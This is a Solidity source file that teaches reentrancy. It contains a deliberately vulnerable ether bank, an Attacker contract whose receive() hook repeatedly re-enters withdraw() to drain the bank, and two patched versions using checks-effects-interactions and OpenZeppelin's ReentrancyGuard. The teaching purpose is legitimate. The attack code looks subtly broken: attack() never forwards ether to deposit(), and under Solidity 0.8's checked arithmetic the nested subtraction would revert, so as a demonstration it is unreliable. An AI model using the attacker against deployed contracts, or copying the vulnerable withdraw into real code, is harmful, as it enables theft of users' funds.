//SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

contract TestReetrantBad {
    mapping(address => uint256) private _balances;

    function deposit() public payable {
        _balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        address user = msg.sender;
        uint256 amount = _balances[user];
        require(amount > 0, "insufficient balance");

        (bool success,) = user.call{value: amount}("");
        require(success, "withdraw failed");
        _balances[user] -= amount;
    }
}

// Attacker
contract Attacker {
    address private s_testReetrant;

    constructor(address testReetrant_) {
        s_testReetrant = testReetrant_;
    }

    receive() external payable {
        // 被攻击的合约余额不为 0,就使用
        if (s_testReetrant.balance > 0) {
            TestReetrantBad(s_testReetrant).withdraw();
        }
    }

    function attack() public payable {
        require(msg.value > 0);
        TestReetrantBad(s_testReetrant).deposit();
        TestReetrantBad(s_testReetrant).withdraw();
    }
}

contract TestReetrantGoodV1 {
    mapping(address => uint256) private _balances;

    function deposit() public payable {
        _balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        address user = msg.sender;
        uint256 amount = _balances[user];
        require(amount > 0, "insufficient balance");

        // check, effect, interaction
        _balances[user] -= amount;
        (bool success,) = user.call{value: amount}("");
        require(success, "withdraw failed");
    }
}

contract TestReetrantGoodV2 is ReentrancyGuard {
    mapping(address => uint256) private _balances;

    function deposit() public payable {
        _balances[msg.sender] += msg.value;
    }

    function withdraw() public nonReentrant {
        address user = msg.sender;
        uint256 amount = _balances[user];
        require(amount > 0, "insufficient balance");

        // check, effect, interaction
        _balances[user] -= amount;
        (bool success,) = user.call{value: amount}("");
        require(success, "withdraw failed");
    }
}
